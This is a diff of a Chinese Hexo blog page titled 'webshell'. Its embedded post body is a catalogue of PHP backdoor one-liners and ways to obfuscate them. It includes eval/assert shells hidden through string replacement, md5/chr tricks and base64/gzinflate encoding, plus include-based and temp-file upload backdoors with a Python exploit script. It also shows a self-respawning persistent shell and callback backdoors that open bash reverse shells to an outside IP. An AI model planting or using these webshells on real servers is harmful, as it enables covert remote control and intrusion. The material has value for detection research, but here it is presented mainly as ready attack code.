@@ -1,335 +1,341 @@
+
 <!DOCTYPE html>
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang="zh">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
-
-
-
-
-  
-  
-  
-  
-
-  
+<html lang="zh-cn">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="Hexo">
+    <title>webshell - Hexo</title>
+    <meta name="author" content="John Doe">
     
     
-  
-
-  
-
-  
-
-  
-
-  
-
-  
     
-    
-    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
-  
-
-
-
-
-
-
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
-
-<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
-
-
-  <meta name="keywords" content="Hexo, NexT">
-
-
-
-
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
-
-
-
-
-
-
-<meta name="description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
-<meta property="og:type" content="article">
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"articleBody":"\n\n直接使用eval1&lt;?php @eval($_POST[shell]);?&gt;\n\n字符替换替换一替换参数\n1&lt;?php $s=$_POST['shell']; @eval(\"$s;\");?&gt;\n\n替换二替换函数\n1&lt;?php $s=str_replace('x','','exxvxxaxxl'); @$s($_POST[shell]);?&gt;\n\n替换三替换函数进阶1&lt;?php @$_GET[func]($_POST[code]);?&gt;\n\n截断替换1&lt;?php $s=substr('helloworldeval',10);@$s($_POST[shell]);?&gt;\n\n替换四通过索引取md5值中的字符，再加上chr转换构造出assert\n12345&lt;?php$a=md5('a').'&lt;br&gt;';$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);$poc($_GET['a']);?&gt;\n\n编码构造base64() :使用base64对数据进行编码\ngzdeflate() :对数据进行Deflate压缩，gzinflate()解压缩\nstr_rot13() :对字符串执行 ROT13 转换\nbae64编码参数编码\n1&lt;?php @base64_decode($_GET['a'])($_GET[b]);?&gt;\n\n1eval(gzinflate(base64_decode($code)));\n\n文件包含型后门includeinclude可以解析php，不管文件的后缀是什么样的\n12$filename=$_GET['code']; include ($filename);\n\n可以上传一个txt后缀格式的文件，包含一下\ninclude进阶php有一个特性，接受上传的临时文件，在这个请求结束后，会把临时文件删除，所以必须在上传文件的请求包内，调用webshell\ntshell.php\n123&lt;?phpinclude($_FILES[\"file\"][\"tmp_name\"]);?&gt;\n\nexp.py\n1234567# -*- coding: utf-8 -*-import requestsurl = \"http://127.0.0.1/tshell.php?c=system('id');\"files = &#123;'file': ('filename.php', '&lt;?php eval($_REQUEST[c]);?&gt;', 'image/jpeg')&#125;response = requests.post(url, files=files)content = response.contentprint content\n\n包含请求头1&lt;?php system($_SERVER['HTTP_USER_AGENT']);?&gt;\n\n通过user_agent传参\n内存驻留马123456789101112&lt;?php    ignore_user_abort(true);    set_time_limit(0);    $file = 'c.php';    $code = '&lt;?php eval($_POST[c]);?&gt;';    while(true) &#123;        if(!file_exists($file)) &#123;            file_put_contents($file, $code);        &#125;        usleep(50);    &#125;?&gt;\n\ncreate_function()回调函数ob_start1&lt;?php function a($b)&#123;exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;ob_start(\"a\");?&gt;\n\nheader_register_callback12&lt;?php function a() &#123;exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;header_register_callback('a');?&gt;&lt;?php function a() &#123;$_GET[c]($_GET[d]);&#125;header_register_callback('a');?&gt;\n\nfilter_input12345# 需要 POST 一个 C 参数 , 就会触发反弹 shell&lt;?php function a($value)&#123; exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1\"');&#125;filter_input(INPUT_POST, 'c', FILTER_CALLBACK, array('options' =&gt; 'a'));?&gt;# 直接菜刀连接 , 密码为 chttp://127.0.0.1/index.php?&amp;c=assert&amp;d=eval($_POST['c'])&lt;?php function a($c)&#123;$c($_GET['d']);&#125;filter_input(INPUT_GET,'c', FILTER_CALLBACK,array('options'=&gt;'a'));?&gt;\n\n类似的函数还有\n123filter_var() - Filters a variable with a specified filterfilter_input_array() - Gets external variables and optionally filters themfilter_var_array() - Gets multiple variables and optionally filters them\n\nstream_wrapper_register12345678910&lt;?phpclass A&#123;    function __construct()&#123;        phpinfo();        // $_GET[c]($_GET[d]);    &#125;&#125;stream_wrapper_register(\"st\", \"A\");$fp = fopen(\"st://\",\"r\");?&gt;\n\n参考链接\nhttps://www.anquanke.com/post/id/85083\nhttps://www.jianshu.com/p/13cb1d8d0441\n","dateCreated":"2019-09-28T09:47:26+08:00","dateModified":"2019-10-09T10:22:05+08:00","datePublished":"2019-09-28T09:47:26+08:00","description":"","headline":"webshell","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/09/28/webshell/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":["https://github.com/","http://stackoverflow.com/users","https://twitter.com/","https://facebook.com/","https://plus.google.com/","https://www.linkedin.com/profile/","mailto"]},"url":"http://yoursite.com/2019/09/28/webshell/"}</script>
+    <meta name="description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
+<meta property="og:type" content="blog">
 <meta property="og:title" content="webshell">
 <meta property="og:url" content="http://yoursite.com/2019/09/28/webshell/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
-<meta property="og:locale" content="zh">
+<meta property="og:locale" content="zh-cn">
 <meta property="og:updated_time" content="2019-10-09T02:22:05.267Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="webshell">
 <meta name="twitter:description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
+    
+    
+        
+    
+    
+    
+    
+    
+    <!--STYLES-->
+    <link rel="stylesheet" href="/assets/css/style-6tgl0yz7lnfzkusrxanjzjinweinxlhwhjly7phr1vxoylo39j7uvbjbwsfg.min.css">
+    <!--STYLES END-->
+    
 
+    
 
-
-<script type="text/javascript" id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: true,
-    tabs: true,
-    motion: true,
-    duoshuo: {
-      userId: '0',
-      author: 'Author'
-    },
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-
-  <link rel="canonical" href="http://yoursite.com/2019/09/28/webshell/">
-
-
-
-
-
-  <title>webshell | Hexo</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
+        
+    
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+    <body>
+        <div id="blog">
+            <!-- Define author's picture -->
 
-  
-  
-    
-  
 
-  <div class="container sidebar-position-left page-post-detail ">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta ">
     
 
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Hexo</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
+<header id="header" data-behavior="4">
+    <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+    <div class="header-title">
+        <a
+            class="header-title-link"
+            href="/ "
+            aria-label=""
+        >
+            Hexo
+        </a>
     </div>
-      
-        <p class="site-subtitle"></p>
-      
-  </div>
-
-  <div class="site-nav-toggle">
-    <button>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-<nav class="site-nav">
-  
-
-  
-    <ul id="menu" class="menu">
-      
+    
         
-        <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
-            
-            Home
-          </a>
-        </li>
-      
+            <a
+                class="header-right-picture "
+                href="#about"
+                aria-label="打开链接: /#about"
+            >
         
-        <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
-            
-            Archives
-          </a>
-        </li>
-      
         
-        <li class="menu-item menu-item-tags">
-          <a href="/tags/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
-            
-            Tags
-          </a>
-        </li>
-      
+        </a>
+    
+</header>
 
-      
-    </ul>
-  
+            <!-- Define author's picture -->
 
-  
+
+<nav id="sidebar" data-behavior="4">
+    <div class="sidebar-container">
+        
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/"
+                            
+                            rel="noopener"
+                            title="首页"
+                        >
+                        <i class="sidebar-button-icon fa fa-home" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">首页</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-categories"
+                            
+                            rel="noopener"
+                            title="分类"
+                        >
+                        <i class="sidebar-button-icon fa fa-bookmark" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">分类</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-tags"
+                            
+                            rel="noopener"
+                            title="标签"
+                        >
+                        <i class="sidebar-button-icon fa fa-tags" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">标签</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/all-archives"
+                            
+                            rel="noopener"
+                            title="归档"
+                        >
+                        <i class="sidebar-button-icon fa fa-archive" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">归档</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link open-algolia-search"
+                            href="#search"
+                            
+                            rel="noopener"
+                            title="搜索"
+                        >
+                        <i class="sidebar-button-icon fa fa-search" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">搜索</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="#about"
+                            
+                            rel="noopener"
+                            title="关于"
+                        >
+                        <i class="sidebar-button-icon fa fa-question" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">关于</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://github.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="GitHub"
+                        >
+                        <i class="sidebar-button-icon fab fa-github" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">GitHub</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="http://stackoverflow.com/users"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Stack Overflow"
+                        >
+                        <i class="sidebar-button-icon fab fa-stack-overflow" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Stack Overflow</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://twitter.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Twitter"
+                        >
+                        <i class="sidebar-button-icon fab fa-twitter" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Twitter</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://facebook.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Facebook"
+                        >
+                        <i class="sidebar-button-icon fab fa-facebook" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Facebook</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://plus.google.com/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="Google Plus"
+                        >
+                        <i class="sidebar-button-icon fab fa-google-plus" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">Google Plus</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="https://www.linkedin.com/profile/"
+                            
+                                target="_blank"
+                            
+                            rel="noopener"
+                            title="LinkedIn"
+                        >
+                        <i class="sidebar-button-icon fab fa-linkedin" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">LinkedIn</span>
+                    </a>
+            </li>
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/mailto"
+                            
+                            rel="noopener"
+                            title="邮箱"
+                        >
+                        <i class="sidebar-button-icon fa fa-envelope" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">邮箱</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+            <ul class="sidebar-buttons">
+            
+                <li class="sidebar-button">
+                    
+                        <a
+                            class="sidebar-button-link "
+                            href="/atom.xml"
+                            
+                            rel="noopener"
+                            title="RSS"
+                        >
+                        <i class="sidebar-button-icon fa fa-rss" aria-hidden="true"></i>
+                        <span class="sidebar-button-desc">RSS</span>
+                    </a>
+            </li>
+            
+        </ul>
+        
+    </div>
 </nav>
 
-
-
- </div>
-    </header>
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          <div id="content" class="content">
             
-
-  <div id="posts" class="posts-expand">
+            <div id="main" data-behavior="4"
+                 class="
+                        hasCoverMetaIn
+                        ">
+                
+<article class="post">
     
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/28/webshell/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
     
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">webshell</h1>
-        
-
+        <div class="post-header main-content-wrap text-left">
+    
+        <h1 class="post-title">
+            webshell
+        </h1>
+    
+    
         <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-28T09:47:26+08:00">
-                2019-09-28
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
+    <time datetime="2019-09-28T09:47:26+08:00">
+	
+		    9月 28, 2019
+    	
+    </time>
     
+</div>
 
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</div>
 
-      
-      
-
-      
-        <a id="more"></a>
+    
+    <div class="post-content markdown">
+        <div class="main-content-wrap">
+            <a id="more"></a>
 
 <h2 id="直接使用eval"><a href="#直接使用eval" class="headerlink" title="直接使用eval"></a>直接使用eval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[shell]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -385,330 +391,315 @@
 <p><a href="https://www.anquanke.com/post/id/85083" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85083</a></p>
 <p><a href="https://www.jianshu.com/p/13cb1d8d0441" target="_blank" rel="noopener">https://www.jianshu.com/p/13cb1d8d0441</a></p>
 
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-      
-      
-
-      
-        <div class="post-nav">
-          <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/09/25/php可变变量/" rel="next" title="php可变变量">
-                <i class="fa fa-chevron-left"></i> php可变变量
-              </a>
-            
-          </div>
-
-          <span class="post-nav-divider"></span>
-
-          <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/10/05/fuzz/" rel="prev" title="fuzz">
-                fuzz <i class="fa fa-chevron-right"></i>
-              </a>
-            
-          </div>
-        </div>
-      
-
-      
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-
-    <div class="post-spread">
-      
-    </div>
-  </div>
-
-
-          </div>
-          
-
-
-          
-  <div class="comments" id="comments">
-    
-  </div>
 
 
         </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
         
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
-    
-    <div class="sidebar-inner">
-
-      
-
-      
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
-            Overview
-          </li>
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/10/05/fuzz/"
+                    data-tooltip="fuzz"
+                    aria-label="上一篇: fuzz"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/25/php可变变量/"
+                    data-tooltip="php可变变量"
+                    aria-label="下一篇: php可变变量"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
         </ul>
-      
-
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
-          <p class="site-author-name" itemprop="name">John Doe</p>
-           
-              <p class="site-description motion-element" itemprop="description"></p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives/">
-                <span class="site-state-item-count">47</span>
-                <span class="site-state-item-name">posts</span>
-              </a>
-            </div>
-          
-
-          
-
-          
-
-        </nav>
-
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-
-        <div class="links-of-author motion-element">
-          
-        </div>
-
-        
-        
-
-        
-        
-
-        
-
-
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
             
-              
             
-
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/28/webshell/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#直接使用eval"><span class="nav-number">1.</span> <span class="nav-text">直接使用eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符替换"><span class="nav-number">2.</span> <span class="nav-text">字符替换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#替换一"><span class="nav-number">2.1.</span> <span class="nav-text">替换一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#替换二"><span class="nav-number">2.2.</span> <span class="nav-text">替换二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#替换三"><span class="nav-number">2.3.</span> <span class="nav-text">替换三</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#替换函数进阶"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">替换函数进阶</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#截断替换"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">截断替换</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#替换四"><span class="nav-number">2.4.</span> <span class="nav-text">替换四</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#编码构造"><span class="nav-number">3.</span> <span class="nav-text">编码构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bae64编码"><span class="nav-number">3.1.</span> <span class="nav-text">bae64编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含型后门"><span class="nav-number">4.</span> <span class="nav-text">文件包含型后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#include"><span class="nav-number">4.1.</span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include进阶"><span class="nav-number">4.2.</span> <span class="nav-text">include进阶</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#包含请求头"><span class="nav-number">5.</span> <span class="nav-text">包含请求头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存驻留马"><span class="nav-number">6.</span> <span class="nav-text">内存驻留马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#create-function"><span class="nav-number">7.</span> <span class="nav-text">create_function()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回调函数"><span class="nav-number">8.</span> <span class="nav-text">回调函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ob-start"><span class="nav-number">8.1.</span> <span class="nav-text">ob_start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#header-register-callback"><span class="nav-number">8.2.</span> <span class="nav-text">header_register_callback</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filter-input"><span class="nav-number">8.3.</span> <span class="nav-text">filter_input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stream-wrapper-register"><span class="nav-number">8.4.</span> <span class="nav-text">stream_wrapper_register</span></a></li></ol></li></div>
             
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/28/webshell/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/28/webshell/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
 
-          </div>
-        </section>
-      <!--/noindex-->
-      
 
-      
-
+        
+        
+            
+        
     </div>
-  </aside>
+</article>
 
 
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2020 John Doe. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/10/05/fuzz/"
+                    data-tooltip="fuzz"
+                    aria-label="上一篇: fuzz"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/25/php可变变量/"
+                    data-tooltip="php可变变量"
+                    aria-label="下一篇: php可变变量"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
         
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2019</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/28/webshell/"
+                    title="分享到 Facebook"
+                    aria-label="分享到 Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/28/webshell/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/28/webshell/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
 </div>
 
 
-<div class="powered-by">
-  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
-</div>
+                </div>
+                
